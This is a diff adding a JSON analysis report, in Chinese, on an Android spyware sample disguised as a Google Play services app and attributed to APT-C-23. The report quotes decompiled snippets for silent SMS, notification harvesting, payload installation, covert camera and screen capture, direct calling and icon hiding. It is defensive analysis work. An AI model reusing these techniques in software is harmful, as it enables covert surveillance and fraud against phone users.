@@ -1,0 +1,292 @@
+{
+  "APK信息": {
+    "文件名": "b2396341f77b9549f62a0ce8cc7dacf5aa250242ed30ed5051356d819b60abff.apk",
+    "sha256": "b2396341f77b9549f62a0ce8cc7dacf5aa250242ed30ed5051356d819b60abff",
+    "包名": "com.telegram.safe",
+    "应用名": "Google Play services for Edge",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 979.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_031;",
+          "method_signature": "a(String phoneNo, String msg)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(phoneNo, null, msg, null, null);",
+          "malicious_code_snippet_context": "  \n      public void a(String phoneNo, String msg) {\n          try {\n>>>             SmsManager smsManager = SmsManager.getDefault();\n>>>             smsManager.sendTextMessage(phoneNo, null, msg, null, null);\n          } catch (Exception ex) {\n              ex.printStackTrace();\n          }",
+          "behavior_description": "该代码通过 SmsManager.getDefault() 获取系统短信管理器，调用 sendTextMessage() 向指定号码静默发送短信，全程无用户界面、无用户确认。发送的目标号码和短信内容来自变量 call_sms_number 和 call_sms_mess，这些参数由远程指令（C2服务器下发命令）控制，数据流向为：远程命令参数→sendTextMessage() 静默发送。结合该样本为 APT-C-23 组织的 Android/SpyC23.A 间谍软件，攻击者可远程操控受害者手机任意发送短信，用于订阅增值服务扣费、发送钓鱼链接传播恶意软件或冒充受害者实施诈骗，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_CONTACTS"
+        ],
+        "字符串": [
+          "com.whatsapp",
+          "com.facebook.katana"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\listeners\\NotificationListener;",
+          "method_signature": "if(this.f5119c.contains(\"com.whatsapp\")",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.f5119c.contains(\"com.whatsapp\") || this.f5119c.contains(\"com.facebook.katana\") || this.f5119c.contains(\"com.facebook.orca\") || this.f5119c.contains(\"org.telegram.messenger\") || this.f5119c.contains(\"com.instagram.android\") || this.f5119c.contains(\"com.skype.raider\") || this.f5119c.contains(\"com.imo.android.imoim\") || this.f5119c.contains(\"com.viber.voip\")) {\n    Bundle extras = sbn.getNotification().extras;\n    String title = extras.getString(\"android.title\");\n    String text = extras.getCharSequence(\"android.text\").toString();\n    String remain = str.substring(str.indexOf(\".\") + 1);\n    App_Name = remain.substring(0, remain.indexOf(\".\")).toUpperCase();\n}",
+          "malicious_code_snippet_context": "                  }\n              }\n          }\n>>>         if (this.f5119c.contains(\"com.whatsapp\") || this.f5119c.contains(\"com.facebook.katana\") || this.f5119c.contains(\"com.facebook.orca\") || this.f5119c.contains(\"org.telegram.messenger\") || this.f5119c.contains(\"com.instagram.android\") || this.f5119c.contains(\"com.skype.raider\") || this.f5119c.contains(\"com.imo.android.imoim\") || this.f5119c.contains(\"com.viber.voip\")) {\n>>>             Bundle extras = sbn.getNotification().extras;\n>>>             String title = extras.getString(\"android.title\");\n>>>             String text = extras.getCharSequence(\"android.text\").toString();\n>>>             Log.e(f5117g, title);\n>>>             Log.e(f5117g, text);\n>>>             String Edited_App_Name = null;\n              String str = this.f5119c;\n              String remain = str.substring(str.indexOf(\".\") + 1);\n              if (this.f5119c != null && remain.contains(\".\")) {",
+          "behavior_description": "该代码位于NotificationListenerService通知监听器中，属于典型的通知劫持行为：当WhatsApp、Facebook/Messenger、Telegram、Instagram、Skype、IMO、Viber等主流社交通讯应用产生通知时，恶意程序提取通知标题(android.title)和消息正文(android.text)，并从包名解析出对应应用名，用于后续伪造/冒充该应用的通知或外传聊天内容，从而实现聊天消息窃取与社交蠕虫式传播（如以受害者会话为载体向其联系人推送含恶意链接的伪造消息）。同一方法中还存在静默取消securitylogagent、samsung.android、huawei.systemmanager等安全类应用通知并snooze的对抗代码，用于压制安全告警、规避用户察觉，进一步印证其恶意隐蔽意图。数据流向：系统通知栏消息 → onNotificationPosted(sbn) → sbn.getNotification().extras 提取社交应用聊天内容 → 劫持/伪造通知传播恶意链接或上传C2。该行为与ESET报告确认的APT-C-23 Android/SpyC23.A间谍软件的扩展窃密功能相符。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.REQUEST_INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.UNINSTALL_PACKAGE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\activities\\Real_App;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 29)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT < 29) {\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), \"application/vnd.android.package-archive\");\n    startActivity(intent);\n} else {\n    l.f5502a.a(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), getApplicationContext());\n}",
+          "malicious_code_snippet_context": "          } catch (Exception e2) {\n              e2.printStackTrace();\n          }\n>>>         if (Build.VERSION.SDK_INT < 29) {\n>>>             try {\n>>>                 Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>                 intent.setDataAndType(Uri.fromFile(new File(net.axel.app.utils.b.f5417e + \"asset.apk\")), \"application/vnd.android.package-archive\");\n>>>                 startActivity(intent);\n>>>                 return;\n>>>             } catch (Exception e3) {\n                  return;\n              }\n          }",
+          "behavior_description": "该代码实现APK释放器（Dropper）行为：从本地存储路径（net.axel.app.utils.b.f5417e，通常为C2服务器下载的缓存目录）读取asset.apk文件，根据Android版本选择安装方式——Android 10以下通过ACTION_VIEW Intent调起系统安装器安装该APK，Android 10及以上通过PackageInstaller API（l.f5502a.a()）进行安装。数据流向：本地下载的asset.apk（来源可能为C2服务器下载）→ 系统安装器/PackageInstaller安装（sink）。该行为用于安装第二阶段恶意载荷，是APT-C-23间谍软件的典型投放行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lnet\\axel\\app\\activities\\Uninstall_Another;",
+          "method_signature": "if(!dataModel.a()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Uri uri = Uri.fromParts(\"package\", dataModel.d(), null);\nIntent intent = new Intent(\"android.intent.action.UNINSTALL_PACKAGE\", uri);\nintent.putExtra(\"android.intent.extra.RETURN_RESULT\", true);\nstartActivityForResult(intent, 1);\n// 若目标应用为设备管理员，先跳转DeviceAdminAdd移除其管理员权限再卸载\nintent2.setComponent(new ComponentName(\"com.android.settings\", \"com.android.settings.DeviceAdminAdd\"));\nintent2.putExtra(\"android.app.extra.DEVICE_ADMIN\", Uninstall_Another.this.k.get(i2));\nstartActivityForResult(intent2, 2);",
+          "malicious_code_snippet_context": "              uninstall_Another.f5084j = position;\n              e.a.a.e.b dataModel = uninstall_Another.f5077c.get(position);\n              if (!dataModel.a().booleanValue()) {\n>>>                 Uri uri = Uri.fromParts(\"package\", dataModel.d(), null);\n>>>                 Intent intent = new Intent(\"android.intent.action.UNINSTALL_PACKAGE\", uri);\n>>>                 intent.putExtra(\"android.intent.extra.RETURN_RESULT\", true);\n>>>                 Uninstall_Another.this.startActivityForResult(intent, 1);\n>>>                 return;\n>>>             }\n>>>             for (int i2 = 0; i2 < Uninstall_Another.this.k.size(); i2++) {\n>>>                 if (Uninstall_Another.this.k.get(i2).getPackageName().contains(dataModel.d())) {\n                      Intent intent2 = new Intent();\n                      intent2.setComponent(new ComponentName(\"com.android.settings\", \"com.android.settings.DeviceAdminAdd\"));\n                      intent2.putExtra(\"android.app.extra.DEVICE_ADMIN\", Uninstall_Another.this.k.get(i2));",
+          "behavior_description": "该代码位于已确认的 APT-C-23 间谍软件（Android/SpyC23.A）的 Uninstall_Another 活动中，提供卸载其他应用的功能。当用户在已安装应用列表中点击某一项时，代码从列表项数据模型中取出目标应用包名（dataModel.d()），构造以该包为 Uri 的 ACTION_UNINSTALL_PACKAGE 意图并通过 startActivityForResult 发起卸载；若目标应用注册为设备管理员（dataModel.a() 为 true），则先跳转到系统 DeviceAdminAdd 界面引导移除其设备管理员权限，以便绕过保护后完成卸载。数据流向：已安装应用列表（包名）→ 系统卸载意图（卸载任意指定包）。虽然该实现调起系统卸载确认对话框（需用户点击确认，非完全静默），但该功能嵌入在远程可控的间谍软件中，典型用途是诱导受害者移除手机上的安全防护类应用（尤其配合设备管理员权限移除流程专门针对受设备管理员保护的安全软件），属于恶意卸载能力。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\serses\\SERS_038;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Point size = new Point();\nthis.f5400e.getSize(size);\nthis.f5398c = ImageReader.newInstance(size.x, size.y, 1, 2);\nthis.f5401f = o.createVirtualDisplay(\"screencap\", size.x, size.y, this.f5403h, 9, this.f5398c.getSurface(), null, this.f5399d);\nthis.f5398c.setOnImageAvailableListener(new c(this, null), this.f5399d);",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void g() {\n>>>         Point size = new Point();\n>>>         this.f5400e.getSize(size);\n>>>         this.f5404i = size.x;\n>>>         this.f5405j = size.y;\n>>>         this.f5398c = ImageReader.newInstance(this.f5404i, this.f5405j, 1, 2);\n          this.f5401f = o.createVirtualDisplay(\"screencap\", this.f5404i, this.f5405j, this.f5403h, 9, this.f5398c.getSurface(), null, this.f5399d);\n          this.f5398c.setOnImageAvailableListener(new c(this, null), this.f5399d);\n      }",
+          "behavior_description": "该方法首先通过 Display.getSize() 获取设备屏幕分辨率，然后使用 ImageReader.newInstance() 创建图像读取器，再通过 MediaProjection.createVirtualDisplay() 创建名为 \"screencap\" 的虚拟显示屏，将设备屏幕内容实时镜像到 ImageReader 的 Surface 上，最后通过 setOnImageAvailableListener() 注册监听器逐帧捕获屏幕画面。数据流向为：屏幕实时内容（source）→ 虚拟显示屏镜像 → ImageReader Surface → onImageAvailable 回调捕获帧数据（sink），捕获的截图通常会被保存并回传至 C2 服务器。结合厂商报告确认该样本为 APT-C-23 组织的 Android/SpyC23.A 间谍软件，此屏幕捕获功能用于隐蔽监控受害者屏幕（窃取凭据、聊天记录、敏感信息），属于明确的隐私窃取/间谍行为",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lc\\b\\c;",
+          "method_signature": "if(camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Camera camera = this.f2058d;\nif (camera != null) {\n    camera.takePicture(null, null, new a());\n} else {\n    this.f2056b.a(1122);\n    this.f2060f = true;\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.view.SurfaceHolder.Callback\n      public void surfaceDestroyed(SurfaceHolder holder) {\n>>>         Camera camera = this.f2058d;\n>>>         if (camera != null) {\n>>>             camera.stopPreview();\n>>>         }\n>>>     }\n>>> \n>>>     void a(b cameraConfig) {\n          this.f2059e = cameraConfig;\n          if (a(this.f2059e.a())) {\n              if (this.f2058d != null) {",
+          "behavior_description": "该代码实现后台静默拍照功能。方法c()获取已打开的Camera实例，若摄像头可用则调用camera.takePicture(null, null, new a())进行拍照，其中快门回调（ShutterCallback）和原始图像回调均传null，意味着拍照过程无任何快门提示和UI反馈，完全在用户无感知的情况下进行。拍摄得到的JPEG图像字节数据通过内部类a（实现Camera.PictureCallback接口）的onPictureTaken回调接收。结合该样本为APT-C-23组织的Android/SpyC23.A间谍软件（ESET报告确认其具备扩展间谍功能），拍摄的照片会被窃取并回传至攻击者控制的C2服务器，属于典型的隐蔽隐私窃取行为。数据流向：设备摄像头采集的图像数据→camera.takePicture()静默捕获→PictureCallback回调接收图像字节流→（后续）上传至攻击者服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_011;",
+          "method_signature": "if(Number.equals(\"1\")",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent callIntent = new Intent(\"android.intent.action.CALL\");\ncallIntent.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(phone))));\ncallIntent.putExtra(\"simSlot\", slot);\ncontext.startActivity(callIntent);",
+          "malicious_code_snippet_context": "          } else if (Number.equals(\"2\")) {\n              slot = 1;\n          }\n>>>         Intent callIntent = new Intent(\"android.intent.action.CALL\");\n>>>         callIntent.setFlags(268468224);\n>>>         callIntent.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(phone))));\n>>>         callIntent.putExtra(\"simSlot\", slot);\n          Log.d(\"CALLING FROM : \", \"SLOT Number \" + slot);\n          if (b.f.e.a.a(context, \"android.permission.CALL_PHONE\") != 0) {\n              return;",
+          "behavior_description": "该方法接收外部传入的电话号码参数 phone（在 Android/SpyC23.A 间谍软件上下文中，该号码通常由 C2 服务器远程指令下发），随后构造 ACTION_CALL Intent 并设置 tel: URI，还通过 simSlot 参数指定使用哪张 SIM 卡（读取配置 CHILD 决定卡槽），在通过 CALL_PHONE 权限检查后直接调用 startActivity() 静默发起电话呼叫。注意此处使用的是 ACTION_CALL 而非 ACTION_DIAL，即无需用户在拨号界面确认即可直接拨打电话，可被攻击者用于拨打高额费率号码造成用户话费损失，或拨打特定号码实现环境窃听，属于 APT-C-23 间谍软件的远程控制功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\utils\\k;",
+          "method_signature": "x(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void x(Context context) {\n    PackageManager p2 = context.getPackageManager();\n    f5449c = new ComponentName(context.getResources().getString(R.string.app_id), context.getResources().getString(R.string.launcher_class));\n    p2.setComponentEnabledSetting(f5449c, 2, 1);\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void x(Context context) {\n>>>         Log.e(f5447a, \"HIDE ICON NOW\");\n>>>         PackageManager p2 = context.getPackageManager();\n>>>         f5449c = new ComponentName(context.getResources().getString(R.string.app_id), context.getResources().getString(R.string.launcher_class));\n>>>         p2.setComponentEnabledSetting(f5449c, 2, 1);\n          f5448b = e.a.a.a.a.a(context);\n          f5448b.a(\"COUNTRY_NAME\", true);\n      }",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 将应用的启动器组件（launcher activity）设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED，参数1 = DONT_KILL_APP），使应用图标从桌面启动器中消失，用户无法察觉应用存在也难以直接卸载。日志'HIDE ICON NOW'明确表明隐藏意图。配套方法 j() 还通过切换多个组件别名（wifi_extra_class、extra_class、non_trans_extra_class）的启用/禁用状态实现图标伪装切换。数据流向：从资源文件读取 app_id 与 launcher_class 构造 ComponentName（source）→ 调用 setComponentEnabledSetting 禁用启动器组件实现图标隐藏（sink）。这是 APT-C-23 (Android/SpyC23.A) 间谍软件安装后隐蔽驻留、逃避用户察觉与卸载的典型手法，为后续持续窃取隐私（通话记录、短信、位置等）提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\axel\\app\\reses\\RES_014;",
+          "method_signature": "if(permissions_granted)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "boolean permissions_granted = this.f5178b.a(\"API_ACCOUNT_MINISTATEMENT\");\nif (permissions_granted) {\n    k.v(context, 120);\n} else {\n    k.z(context, 0);\n    Process.killProcess(Process.myPid());\n}",
+          "malicious_code_snippet_context": "          this.f5178b = e.a.a.a.a.a(context);\n          Log.d(this.f5177a, \"onReceive\");\n          if (e.a.a.b.a.e(context)) {\n>>>             boolean permissions_granted = this.f5178b.a(\"API_ACCOUNT_MINISTATEMENT\");\n>>>             if (permissions_granted) {\n>>>                 k.v(context, 120);\n>>>             } else {\n>>>                 k.z(context, 0);\n>>>                 Process.killProcess(Process.myPid());\n>>>             }\n          }\n      }\n  }",
+          "behavior_description": "该代码位于 BroadcastReceiver.onReceive 中：首先检查权限/API 'API_ACCOUNT_MINISTATEMENT' 是否已授权（source：本地权限授权状态检查结果），若已授权则延时调度任务 k.v(context,120)；若未授权，则先通过 k.z(context,0) 立即调度重启任务（疑似 AlarmManager 定时拉起），随后调用 Process.killProcess(Process.myPid()) 强制杀死自身进程（sink）。这是 APT-C-23 间谍软件（Android/SpyC23.A）典型的'自杀进程+定时器重启'保活/持久化机制：数据流向为 权限检查结果 → 进程强杀 + 定时重启调度，在未获得所需权限时杀死自身进程并借助定时任务自动拉起，迫使应用反复重启直至获得权限，从而维持恶意后台服务的持续运行与权限索取，属于支撑间谍软件持久化的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
